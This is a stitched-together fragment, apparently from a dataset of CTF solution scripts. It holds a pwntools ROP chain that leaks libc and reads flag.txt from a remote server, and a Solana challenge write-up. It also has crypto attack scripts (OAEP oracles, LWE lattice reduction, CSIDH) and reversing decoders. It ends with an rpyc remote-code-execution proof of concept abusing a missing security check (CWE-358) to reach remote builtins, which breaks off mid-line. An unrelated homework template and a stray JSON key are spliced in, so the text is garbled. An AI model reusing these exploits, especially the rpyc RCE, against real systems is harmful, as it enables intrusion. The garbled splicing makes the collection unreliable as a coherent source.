#pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10e060) #write\n\np.sendline(pay)\n\np.sendline(p64(0x0061616161616161))\n\np.interactive()\n```\n\n### OtterWorld:\n\nThe code for this challenge is fairly simple and straightforward. The only thing that stands out is the following constraints in `framework/chall/programs/chall/src/lib.rs`\n\n```rust\n#[account(\n    constraint = password.key().as_ref()[..4] == b\"osec\"[..]\n)]\npub password: AccountInfo<'info>,\n```\n\nTo solve this challenge, we need to pass in a `password` that has a decoded public key with the first 4 bytes as \"osec\"\n\nSolana public keys are base58 encoded, you can get an idea of what it looks like in the server log. To generate a public key which the first 4 bytes are \"osec\", we can take an existing key and convert it into decimal (since that is what rust eventually uses to compare)\n\n![](https://imgur.com/CPNEyzZ.png)\n\nWe can then replace the first four numbers with `111 115 101 99` and encode the whole public key again back to its base58 format and get something like `8W4K4D8y1y7nXqNAYc3CtBMWj1dFDJRxrSbqffLTSg8u`. This will be the `password` we will pass to the server when we call the `get_flag` function.\n\nexp:\n\n`framework-solve/solve/programs/solve/src/lib.rs`:\n\n```rust\nuse anchor_lang::prelude::*;\n\nuse anchor_spl::token::Token;\n\ndeclare_id!(\"osecio1111111111111111111111111111111111111\");\n\n#[program]\npub mod solve {\n    use super::*;\n\n    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {\n        \n        \n        let get_flag_acc = chall::cpi::accounts::GetFlag {\n            flag:ctx.accounts.state.to_account_info(),\n            password: ctx.accounts.password.to_account_info(),\n            payer: ctx.accounts.payer.to_account_info(),\n            system_program: ctx.accounts.system_program.to_account_info(),\n            rent: ctx.accounts.rent.to_account_info(),\n        };\n\n        let cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), get_flag_acc);\n        chall::cpi::get_flag(cpi_deposit)?;\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct GetFlag<'info> {\n    #[account(mut)]\n    pub state: AccountInfo<'info>,\n    pub password: AccountInfo<'info>,\n    #[account(mut)]\n    pub payer: Signer<'info>,\n    pub system_program: Program<'info, System>,\n    pub token_program: Program<'info, Token>,\n    pub rent: Sysvar<'info, Rent>,\n    pub chall: Program<'info, chall::program::Chall>\n}\n```\n\n`framework-solve/src/main.rs`:\n\n```rust\nuse chall::anchor_lang::{InstructionData, ToAccountMetas};\nuse chall::FLAG_SEED;\nuse solana_program::pubkey;\nuse solana_program::pubkey::Pubkey;\nuse std::net::TcpStream;\nuse std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};\n\nfn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<d", "solution_code": "from pwn import *\n\n#p = process('bop')\np = remote('mc.ax', 30284)\n\npay = b'a'*32 + p64(0x404120-0x8)\npay += p64(0x00000000004013d3+1) #ret\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404090)\npay += p64(0x4010F0) #printf\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100) #bss\npay += p64(0x401100) #gets\npay += p64(0x401364) #leave_ret\n\np.sendline(pay)\n\nlibc_base = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 0x1ec980\nprint(f'libc_base = {hex(libc_base)}')\n\npay = b'flag.txt'.ljust(32,b'\\x00')\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x0)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(libc_base - 0x2898)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x8)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x404100)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x0)\npay += p64(libc_base+0x0000000000036174) #pop_rax\npay += p64(0x2) #open\npay += p64(libc_base+0x000000000007f1d2)\npay += p64(libc_base+0x25EE2) #syscall\n\npay += p64(0x0061616161616161) * 13\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x3)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10dfc0) #read\n\npay += p64(0x00000000004013d3) #pop_rdi\npay += p64(0x1)\npay += p64(libc_base+0x000000000002601f) #pop_rsi\npay += p64(0x404300)\npay += p64(libc_base+0x0000000000142c92) #pop_rdx\npay += p64(0x100)\npay += p64(libc_base+0x10e060) #write\n\np.sendline(pay)\n\np.sendline(p64(0x0061616161616161))\n\np.interactive()\n\n# DICE 1001\n# Homework 3\n#\n# @author [full name]\n# @student_id [student id]\n#\n# Collaborators:\n# - [list collaborators here]\n#\n# Resources:\n# - [list resources consulted]\n\ndef add(a, b):\n    '''\n    Return the sum of a and b.\n\n    Parameters:\n        a (int): The first number to add.\n        b (int): The second number to add.\n\n    Returns:\n        int: The sum of a and b.\n    '''\n\n    ######## YOUR CODE ########\n\n    raise NotImplementedError\n\n    ###########################\n\ndef longest(words):\n    ...\n\ndef common(a, b):\n    ...\n\ndef favorite():\n    ...\n\ndef factor(n):\n    ...\n\ndef preimage(hash):\n    ...\n\ndef magic():\n    ...\n\n...\ndef encrypt(pk0, pk1, msg):\n    r = urandom(16)\n    r_prime = strxor(r, msg)\n    ct0 = pk0.encrypt(r, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),\n                         algorithm=hashes.SHA256(), label=None))\n    ct1 = pk1.encrypt(r_prime, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), \n                         algorithm=hashes.SHA256(), label=None))\n    return ct0.hex() + ct1.hex()\n...encrypt:\n                ct = encrypt(pk0, pk1, msg)\n                seen_ct.add(ct)\n...decrypt:\n                in_ct = bytes.fromhex(input(\"ct (512 byte hexstring): \").strip())\n                if len(in_ct) != 512:\n                    print(\"Must be 512 bytes!\")\n                    exit(0)\n                if in_ct in seen_ct:\n                    print(\"Cannot query decryption on seen ciphertext!\")\n                    exit(0)\n                print(decrypt(key0, key1, in_ct).hex())\n...\n\nfrom pwn import *\nimport os\nfrom Crypto.Util.strxor import strxor\nfrom tqdm import trange\n\ndef enc(io,m0,m1):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'1')\n    io.recvuntil(b'm0 (16 byte hexstring):')\n    io.sendline(m0.hex().rjust(32).encode())\n    io.recvuntil(b'm1 (16 byte hexstring):')\n    io.sendline(m1.hex().rjust(32).encode())\n    ret = io.recvline().strip()\n    c1 = bytes.fromhex(ret[:512].decode())\n    c2 = bytes.fromhex(ret[512:].decode())\n    return c1,c2\n\ndef dec(io,c1,c2):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    io.sendline((c1+c2).hex().rjust(1024).encode())\n    ret = io.recvline().strip()\n    print(ret)\n    return bytes.fromhex(ret.decode())\n\ndef guess(io,m0,m1,c_dec):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\ndef exp(io):\n    io.recvuntil(b'pk0 = ')\n    n0 = int(io.recvline().strip())\n    io.recvuntil(b'pk1 = ')\n    n1 = int(io.recvline().strip())\n    m0 = os.urandom(16)\n    m1 = os.urandom(16)\n    c0,c1 = enc(io,m0,m1)\n    c_dec = dec(io,c0,c1)\n    guess(io,m0,m1,c_dec)\n\nio = remote(\"mc.ax\",31493)\nfor _ in trange(128):\n    exp(io)\nio.interactive()\n\np,b = \nPR.<a> = PolynomialRing(GF(p))\nrng = lambda x: (a*x + b)\nf = rng(rng(rng(11))) - 11\n\na1 = f.roots()[0][0]\n\nfrom Crypto.Util.number import *\nR = [ , , ]\nC = [ , , ]\nN = [ , , ]\ne=11\nequation = []\nnl = N\nP.<x>=PolynomialRing(ZZ)\nfor _ in range(len(R)):\n    f = (x*2**(128) + R[_]) ^ e - C[_]\n    equation.append(f)\nmod=1\nfor i in nl:\n    mod*=i\nff=crt(equation,nl)\nQ.<x>=PolynomialRing(Zmod(mod))\nff=Q(ff)\nff=ff.monic()\n\nprint(ff.small_roots(X=2 ** (8 * (53) ) , epsilon=0.03))\n\nfrom pwn import * \nfrom Crypto.Util.number import *\nimport random\nimport gmpy2\ndef enc(io,m):\n    io.recvuntil(b'Enter your option (EDF) >')\n    io.sendline(b'E')\n    io.recvuntil(b'Enter your integer to encrypt >')\n    io.sendline(str(m).encode())\n    c = int(io.recvline().strip())\n    # print(c)\n    return c\ndef dec(io,c):\n    io.recvuntil(b'Enter your option (EDF) >')\n    io.sendline(b'D')\n    io.recvuntil(b'Enter your integer to decrypt >')\n    io.sendline(str(c).encode())\n    ret = int(io.recvline().strip())\n    # print(ret)\n    return ret\n\nwhile 1:\n    io = remote(\"mc.ax\", 31370)\n\n    m = random.randrange(0,2**155)\n\n    m2 = m**2\n    m3 = m2 ** 2\n    c1 = enc(io,m)\n    c2 = enc(io,m2)\n    c3 = enc(io,m3)\n    N = GCD(GCD(c1**2-c2,c2**2-c3),c1**4-c3)\n    # print(N)\n\n    tmpn = gmpy2.iroot(N,2)[0] - 1000\n    \n    c = enc(io,tmpn)\n    ret = dec(io,c)\n    print(ret)\n    if ret == tmpn:\n        io.close()\n\n        continue\n    else:\n        print(tmpn)\n        print(ret)\n        io.interactive()\n\nimport time\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nN = 80545740350366696040786599096389633376459388080405575580382175660942931663332287259816708558404888171625893708300948723190479843497481675855026518510172734186173283020307930155237393803233943128148948080353347867114710716892211203994136642581575859259982918065044314498000502057955265527285161355075190715183\nm = 8974727870546643824894480038707533893278804499879297012515661522158486663107155507819765224149386590148491369613973070200195136368831070088919877094607659      \ntmp = 80296603952031207669379394158997610974521100140196930414869684853979258240413843971984784637976573229402081902976836133573481895890773854234442286335635368924479529145071933526879987717959481322524583453167331713734664028421841638802807308225132771704457781451899179116092962676639117772413226298157456795074\nc = 78039359365505830647863120097048278336840870881044130853869085319746050397290701173568458387165336669015392542436720204471746699941342744320642504097261279786910084930105137187694980137555480280357169445825986853526650060940129246485308585373751953485082957347620734091036672512753659098246781542640682747549\nq = (GCD(tmp-m,N))\np = N // q\n\n...\n    def unpad(self, ct_int):\n        \"\"\"Decrypt a message with PKCS#1 OAEP.\n\n        :param ciphertext: The encrypted message.\n        :type ciphertext: bytes/bytearray/memoryview\n\n        :returns: The original message (plaintext).\n        :rtype: bytes\n\n        :raises ValueError:\n            if the ciphertext has the wrong length, or if decryption\n            fails the integrity check (in which case, the decryption\n            key is probably wrong).\n        :raises TypeError:\n            if the RSA key has no private half (i.e. you are trying\n            to decrypt using a public key).\n        \"\"\"\n\n        # See 7.1.2 in RFC3447\n        modBits = Crypto.Util.number.size(self._key.n)\n        k = ceil_div(modBits,8) # Convert from bits to bytes\n        hLen = self._hashObj.digest_size\n \n        m_int = ct_int\n        # Complete step 2c (I2OSP)\n        em = long_to_bytes(m_int, k)\n        # Step 3a\n        lHash = self._hashObj.new(self._label).digest()\n        # Step 3b\n        y = em[0]\n        # y must be 0, but we MUST NOT check it here in order not to\n        # allow attacks like Manger's (http://dl.acm.org/citation.cfm?id=704143)\n        maskedSeed = em[1:hLen+1]\n        maskedDB = em[hLen+1:]\n        # Step 3c\n        seedMask = self._mgf(maskedDB, hLen)\n        # Step 3d\n        seed = strxor(maskedSeed, seedMask)\n        # Step 3e\n        dbMask = self._mgf(seed, k-hLen-1)\n        # Step 3f\n        db = strxor(maskedDB, dbMask)\n        # Step 3g\n        one_pos = hLen + db[hLen:].find(b'\\x01')\n        lHash1 = db[:hLen]\n        invalid = bord(y) | int(one_pos < hLen)\n        hash_compare = strxor(lHash1, lHash)\n        for x in hash_compare:\n            invalid |= bord(x)\n        for x in db[hLen:one_pos]:\n            invalid |= bord(x)\n        if invalid != 0:\n            raise ValueError(\"Incorrect decryption.\")\n        # Step 4\n        return db[one_pos + 1:]\n\nkey = RSA.construct((q*p, e))\ncipher = PKCS1_OAEP.new(key)  \n\ndef rthroot(c, r, q):\n    c %= q\n    assert(isPrime(r) and (q - 1) % r == 0 and (q - 1) % (r**2) != 0)\n    l = ((q - 1) % (r**2)) // r\n    alpha = (-inverse(l, r)) % r\n    root = pow(c, ((1 + alpha * (q - 1) // r) // r), q)\n    return root\n\ndef allroot(r, q, root):\n    all_root = set()\n    all_root.add(root)\n    while len(all_root) < r:\n        new_root = root\n        unity = pow(getRandomRange(2, q), (q - 1) // r, q)\n        for i in range(r - 1):\n            new_root = (new_root * unity) % q\n            all_root.add(new_root)\n    return all_root\n\ndef decrypt(proot, qroot, p, q):\n    count = 0\n    total = len(proot) * len(qroot)\n    t1 = inverse(q, p)\n    t2 = inverse(p, q)\n    for i in proot:\n        for j in qroot:\n            count += 1\n            m = (i * t1 * q + j * t2 * p) % (p * q)\n            \n            assert (pow(m,e,N) == c)\n            try:\n                print( cipher.unpad((m)))\n            except:\n                continue\n\ndef main():\n    print('[+] Calculating e-th root...')\n    start = time.time()\n    proot = rthroot(c, e, p)\n    qroot = pow(c,inverse(e,q-1),q)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n    print('[+] Calculating all e-th roots...')\n    start = time.time()\n    all_proot = allroot(e, p, proot)\n    all_qroot = [qroot]# 3 allroot(e, q, qroot)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n    print('[+] CRT cracking...')\n    start = time.time()\n    decrypt(all_proot, all_qroot, p, q)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n\nif __name__ == '__main__':\n    main()\n\nfrom sage.all import *\nimport numpy as np\nfrom time import time\nn = 512\n# number of public key samples\nm = n + 100\n# plaintext modulus\np = 257\n# ciphertext modulus\nq = 1048583\n\ndata = np.load(r'data.npz')\npk_A=Matrix(GF(q),data['pk_A'].tolist())\npk_b=vector(GF(q),data['pk_b'].tolist())\nencrypt_A=data['encrypt_A'].tolist()\nencrypt_b=data['encrypt_b'].tolist()\n\ndef pk_Aexpress(pk_A):\n    pkA_1 = pk_A[:512,:]\n    pkA_2 = pk_A[512:,:]\n    ks = []\n    for row in pkA_2:\n        ks.append(pkA_1.solve_left(row))\n    return Matrix(ZZ,ks)\n\ndef fuck(A,pk_A):\n    c_tmp = pk_A.solve_left(A)[:-100]\n    print(\"\\nstart to express\")\n    tmpks = pk_Aexpress(pk_A)\n    ks = tmpks[:,:100]\n    print(\" express done \")\n    ks = ks.stack(Matrix(ZZ,[c_tmp[:100]]))\n    M = Matrix(ZZ,100 + 100 + 1,100 + 100 + 1)\n    M[:101,:101] = identity_matrix(101)  \n    M[:101,101:] = ks\n    M[101:,101:] = q * identity_matrix(100)\n    start_time = time()\n    print(\"start to LLL\")\n    ML = M.LLL()\n    rows = ML[0]\n    print(f\"LLL done at {time()-start_time}\")\n    c_new = [0 for i in range(612)]\n    c_list = Matrix(ZZ,Matrix(GF(q),rows[:100]*tmpks) + Integer(rows[100]) * Matrix(GF(q),c_tmp))[0]\n    for _ in range(512):\n        if c_list[_] == q-1:\n            c_new[_] = -1\n        else:\n            c_new[_] = int(c_list[_])\n    for _ in range(100):\n        if rows[_] == q-1:\n            c_new[_+512] = -1\n        else:\n            c_new[_+512] = int(rows[_])\n\n    return c_new\n\nflag_bytes = []\nfrom tqdm import trange\nfor _ in trange(5,len(encrypt_A)-1):\n    A = vector(GF(q),encrypt_A[_])\n    b = encrypt_b[_]\n    c_new = fuck(A,pk_A)\n\n    c_first = c_new[:512]\n    c_secon = c_new[512:]\n\n    c = vector(ZZ, c_first+c_secon)\n    if c*pk_A != A:\n        c_first = [-i for i in c_first]\n        c = vector(ZZ, c_first+c_secon)\n\n    if c*pk_A != A:\n        c_first = [-i for i in c_first]\n        c_secon = [-i for i in c_secon]\n        c = vector(ZZ, c_first+c_secon)\n\n    if c*pk_A != A:\n        c_first = [-i for i in c_first]\n        c = vector(ZZ, c_first+c_secon)\n\n    print(c*pk_A == A)\n\n    msg = int(b - c * pk_b )\n    if msg > q//2:\n        msg -= q\n    m = ZZ(msg % p)\n    flag_bytes.append(int(m))\n    print(_,flag_bytes)\n\na = [112, 117, 98, 108, 105] + [99, 45, 107, 101, 121] + [45, 108, 101, 97, 114] + [110, 105, 110, 103, 45] + [119, 105, 116, 104, 45] + [101, 97, 115, 101, 95] + [98,100,50,102,102] + [97,99,48,53,57,50,101]\n\ndef keygen():\n    priv = ctypes.create_string_buffer(PRIVATE_KEY_SIZE)\n    pub = ctypes.create_string_buffer(PUBLIC_KEY_SIZE)\n    libcsidh.csidh_private(priv)\n    libcsidh.csidh(pub, libcsidh.base, priv)\n    return priv, pub\n\ndef apply_iso(start, iso):\n    end = ctypes.create_string_buffer(PUBLIC_KEY_SIZE)\n    libcsidh.csidh(end, start, iso)\n    return end\n\nclass Alice:\n    ...\n    def encrypt(self, mask):\n        ss0 = apply_iso(mask, invert(self.priv0))\n        ss1 = apply_iso(mask, invert(self.priv1))\n        enc0 = stream(self.msg0, ss0)\n        enc1 = stream(self.msg1, ss1)\n        return enc0, enc1\n        \nmask = ctypes.create_string_buffer(bytes.fromhex(mask_hex), PUBLIC_KEY_SIZE)\nenc0, enc1 = alice.encrypt(mask)\n\n#!/usr/bin/env python3\n\nimport ctypes\nfrom Crypto.Util.number import *\nfrom Crypto.Util.strxor import strxor\nfrom Crypto.Hash import SHAKE128\nfrom pwn import *\n\nPRIVATE_KEY_SIZE = 74\nPUBLIC_KEY_SIZE = 64\nlibcsidh = ctypes.CDLL('./libcsidh.so')\n\ndef pub2int(pub):\n    return bytes_to_long(bytes(pub)[::-1])\n\ndef int2pub(x):\n    return ctypes.create_string_buffer(long_to_bytes(x)[::-1].rjust(64, b'\\x00'), PUBLIC_KEY_SIZE)\n\ndef stream(buf, ss):\n    pad = SHAKE128.new(bytes(ss)).read(len(buf))\n    return strxor(buf, pad)\n\np = 5326738796327623094747867617954605554069371494832722337612446642054009560026576537626892113026381253624626941643949444792662881241621373288942880288065659\n\nhost, port = 'mc.ax 31336'.split(' ')\nio = remote(host, int(port))\nio.recvuntil(b'pub0: ')\npub0 = ctypes.create_string_buffer(bytes.fromhex(io.recvline().strip().decode()), PUBLIC_KEY_SIZE)\nio.recvuntil(b'pub1: ')\npub1 = ctypes.create_string_buffer(bytes.fromhex(io.recvline().strip().decode()), PUBLIC_KEY_SIZE)\nio.sendlineafter(b'mask: ', b'00' * 64)\n\nss0 = int2pub(-pub2int(pub0) % p)\nss1 = int2pub(-pub2int(pub1) % p)\nio.recvuntil(b'enc0: ')\nenc0 = bytes.fromhex(io.recvline().strip().decode())\nio.recvuntil(b'enc1: ')\nenc1 = bytes.fromhex(io.recvline().strip().decode())\n\nmsg0 = stream(enc0, ss0)\nmsg1 = stream(enc1, ss1)\nflag = strxor(msg0, msg1)\nprint(flag)\n# dice{b0p_it_pul1_1t_6op_it_pull_1t_pu1l_1t_b0p_it}\n\nfrom pwn import *\nimport os\nfrom Crypto.Util.strxor import strxor\nfrom Crypto.Util.number import * \nfrom tqdm import trange\n\ndef enc(io,m0,m1):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'1')\n    io.recvuntil(b'm0 (16 byte hexstring):')\n    io.sendline(m0.hex().rjust(32).encode())\n    io.recvuntil(b'm1 (16 byte hexstring):')\n    io.sendline(m1.hex().rjust(32).encode())\n    ret = io.recvline().strip()\n    c1 = bytes.fromhex(ret[:512].decode())\n    c2 = bytes.fromhex(ret[512:].decode())\n    return c1,c2\n\ndef dec(io,c1,c2):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    ct = (c1.hex().rjust(512)+c2.hex().rjust(512)).encode()\n    print(ct)\n    context.log_level='debug'\n    io.sendline(ct)\n    \n    ret = io.recvline().strip()\n    \n    print(ret)\n    return bytes.fromhex(ret.decode())\n\ndef guess(io,m0,m1,c_dec):\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\ndef exp(io):\n    io.recvuntil(b'pk0 = ')\n    n0 = int(io.recvline().strip())\n    io.recvuntil(b'pk1 = ')\n    n1 = int(io.recvline().strip())\n    m0 = os.urandom(16)\n    m1 = os.urandom(16)\n    c00,c01 = enc(io,m0,m1)\n    c10,c11 = enc(io,m0,m1)\n    c20,c21 = enc(io,m0,m1)\n    c_dec1 = dec(io,c00,c11)\n    c_dec2 = dec(io,c10,c21)\n    c_dec3 = dec(io,c20,c01)\n    c_dec = strxor(c_dec1,strxor(c_dec2,c_dec3))\n    guess(io,m0,m1,c_dec)\n\nio = remote(\"mc.ax\",31497)\nfor _ in trange(128):\n    exp(io)\nio.interactive()\n\nfrom pwn import *\n\nleak = open('./input.bin', 'rb').read()\n\nglobal hehe\n\nMAT_SIZE = 0x12\n\ndef recur(mat, col_id, status):\n    global hehe\n    bit_flipping = 1\n    v5 = 0\n    try:\n        if hehe[col_id][status] != -1:\n            return hehe[col_id][status]\n\n        for int_1 in range(MAT_SIZE):\n            if (((1 << int_1) & status) != 0): continue\n\n            if col_id == MAT_SIZE - 1:\n                return mat[col_id][int_1]\n\n            val = mat[col_id][int_1] * bit_flipping\n            ans = recur(mat, col_id + 1, (status | (1 << int_1)))\n            # print(ans)\n            v5 += val * ans\n            bit_flipping = -bit_flipping\n        hehe[col_id][status] = v5\n        return v5\n    except:\n        print(col_id, status)\n        exit(-1)\n\nfor i in range(64):\n    x = leak[0]\n    matrix = []\n    for j in range(x):\n        start = (650 * i + 1 + 36 * j) * 4\n        t = leak[start:start+0x90]\n        k = []\n        for z in range(x):\n            k.append(u64(t[z*8:(z+1)*8]))\n        matrix.append(k)\n\n    hehe = [[-1] * 262144] * 18\n    res = recur(matrix, 0, 0)\n    # print(res)\n    start = (650 * i + 649) * 4\n    print(chr((u64(leak[start:start+8]) - res + i) & 0xff), end = '')\n\norg = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"'\na = 'VRiPyfC7Ih3XxrK6HcsGFoSTlkW9e2!BuNJZAp10En45qjOYb\"azQwDmUMdgv8tL'\n\ntarget = 'm_ERpmfrNkekU4_4asI_Tra1e_4l_c4_GCDlryidS3{Ptsu9i}13Es4V73M4_ans'\n\nfor i in range(len(a)):\n    print(target[a.index(org[i])], end = '')\n    \n# dice{P4ral1isM_m4kEs_eV3ryt4InG_sUp3r_f4ST_aND_s3CuRE_a17m4k9l4}\n\nx, t, n = '', '0', 0\nfor c in '132111311112211112213111513211222213121222213211221111223112131122311151313223113112121131115221121115121211221121232132112241115131121313223122111113112':\n    c = int(c)\n    x += t * c\n    t = '1' if t == '0' else '0'\n    n += c\n    if n == 8:\n        t, n = '0', 0\n    elif n > 8: assert False\nflag = bytearray()\nfor i in range(0, len(x), 8):\n    flag.append(int(x[i:i+8], 2))\nprint(flag.decode())\n#ru57_r3v3r51ng_w1th_4_m4cr0_tw15t\n\nhehe0 = 'ef2**ya**ba5'\nhehe1 = 'pud3**17i__'\nhehe2 = '1nb**iydt8f'\nhehe3 = '}_0_167'\nhehe4 = '7*3**e'\nhehe5 = '2**3**p*d'\nhehe6 = 'h*******_'\nhehe7 = '_*0'\n\ntest = list('dice{________________att3nt1on_________________}')\n\nfor i in range(len(hehe0)):\n    if hehe0[i] == '*': continue\n    x = ((7 + i) * 5) % 48\n    test[x] = hehe0[i]\n\nfor i in range(len(hehe1)):\n    if hehe1[i] == '*': continue\n    x = ((21 + i) * 5) % 48\n    test[x] = hehe1[i]\n\nfor i in range(len(hehe2)):\n    if hehe2[i] == '*': continue\n    x = ((30 + i) * 7) % 48\n    test[x] = hehe2[i]\n\nfor i in range(len(hehe3)):\n    if hehe3[i] == '*': continue\n    x = ((41 + i) * 7) % 48\n    test[x] = hehe3[i]\n\nfor i in range(len(hehe4)):\n    if hehe4[i] == '*': continue\n    x = ((12 + i) * 11) % 48\n    test[x] = hehe4[i]\n\nfor i in range(len(hehe5)):\n    if hehe5[i] == '*': continue\n    x = ((26 + i) * 11) % 48\n    test[x] = hehe5[i]\n\nfor i in range(len(hehe6)):\n    if hehe6[i] == '*': continue\n    x = ((19 + i) * 13) % 48\n    test[x] = hehe6[i]\n\nfor i in range(len(hehe7)):\n    if hehe7[i] == '*': continue\n    x = ((6 + i) * 13) % 48\n    test[x] = hehe7[i]\n\nprint(''.join(test))\n\nflag = \"11223\"\nmagic = {'1': 123, '2': 456, '3': 789}\nfor k in magic.keys():\n    s = 0\n    for i in range(len(flag)):\n        if flag[i] == k:\n            s = 101 * s + i + 1\n    assert magic[k] == s\n\nmagic = {}\nlst = [False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, 319496, False, 2184867, 21925933, 422628, 14733726, 555, False, 4695, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, 320588772, False, 4798, 3775, 1163, 1349, 2565, 4295, False, False, False, False, False, 2044, 433, 660, 964, 1066, False, False, 11733, 226772, False, False, False, False, 764, False, False, False, False, False, False]\nfor idx, elem in enumerate(lst):\n    if elem:\n        magic[chr(idx)] = elem\n\nflag = \"???????\"\nmagic = {'.': 319496, '0': 2184867, '1': 21925933, '2': 422628, '3': 14733726, '4': 555, '6': 4695, '_': 320588772, 'a': 4798, 'b': 3775, 'c': 1163, 'd': 1349, 'e': 2565, 'f': 4295, 'l': 2044, 'm': 433, 'n': 660, 'o': 964, 'p': 1066, 's': 11733, 't': 226772, 'y': 764}\nfor k in magic.keys():\n    s = 0\n    for i in range(len(flag)):\n        if flag[i] == k:\n            s = 101 * s + i + 1\n    assert magic[k] == s\n\nmagic = {'.': 319496, '0': 2184867, '1': 21925933, '2': 422628, '3': 14733726, '4': 555, '6': 4695, '_': 320588772, 'a': 4798, 'b': 3775, 'c': 1163, 'd': 1349, 'e': 2565, 'f': 4295, 'l': 2044, 'm': 433, 'n': 660, 'o': 964, 'p': 1066, 's': 11733, 't': 226772, 'y': 764}\nflag = bytearray(b'\\x00'*100)\nfor k, s in magic.items():\n    vals = []\n    while s != 0:\n        vals.append(s%101-1)\n        s = s // 101\n    for v in vals:\n        flag[v] = ord(k)\nprint(bytes(flag).rstrip(b'\\x00'))\n\nprint(dir(MagicDict))\n\n['__class__', '__contains__', '__copy__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__missing__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'clear', 'copy', 'default_factory', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']\n\nprint(dir(MagicDict.__init__))\n\n['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']\n\nimport rpyc\nfrom types import CodeType\n\nconn = rpyc.connect(\"localhost\", 1337)\n\ndef myeval(self=None, cmd=\"__import__('sys')\"):\n  return eval(cmd)\n\n\"\"\"\n__argcount: int,\n__posonlyargcount: int,\n__kwonlyargcount: int,\n__nlocals: int,\n__stacksize: int,\n__flags: int,\n__codestring: bytes,\n__constants: tuple[object, ...],\n__names: tuple[str, ...],\n__varnames: tuple[str, ...],\n__filename: str, __name: str,\n__qualname: str,\n__firstlineno: int,\n__linetable: bytes,\n__exceptiontable: bytes, __freevars: tuple[str, ...] = ..., __cellvars: tuple[str, ...] = ...\n\"\"\"\ndef get_code(obj_codetype, func, filename=None, name=None):\n  func_code = func.__code__\n  mycode = obj_codetype(func_code.co_argcount, func_code.co_posonlyargcount, func_code.co_kwonlyargcount, func_code.co_nlocals, func_code.co_stacksize, func_code.co_flags, func_code.co_code, func_code.co_consts, func_code.co_names, func_code.co_varnames, func_code.co_filename, func_code.co_name, func_code.co_qualname, func_code.co_firstlineno, func_code.co_linetable, func_code.co_exceptiontable, func_code.co_freevars, func_code.co_cellvars)\n  return mycode\n\ndef netref_getattr(netref, attrname):\n  # PoC CWE-358: abuse __cmp__ function that was missing a security check\n  handler = rpyc.core.consts.HANDLE_CMP\n  return conn.sync_request(handler, netref, attrname, '__getattribute__')\n\nremote_svc_proto = netref_getattr(conn.root, '_protocol')\nremote_dispatch = netref_getattr(remote_svc_proto, '_dispatch_request')\nremote_class_globals = netref_getattr(remote_dispatch, '__globals__')\nremote_modules = netref_getattr(remote_class_globals['sys'], 'modules')\n_builtins = remote_modules['builtins']\nremote_builtins = {k: netref_getattr(_builtins, k) for k in dir(_builtins)}\n\nprint(\"populate globals for CodeType calls on remote\")\nremote_globals = remote_builtins['dict']()\nfor name, netref in remote_builtins.items():\n    remote_globals[name] = netref\nfor name, netref in netref_getattr(remote_modules, 'items')():\n    remote_globals[name] = netref\n\nprint(\"create netrefs for types to create remote function malicously\")\nremote_types = 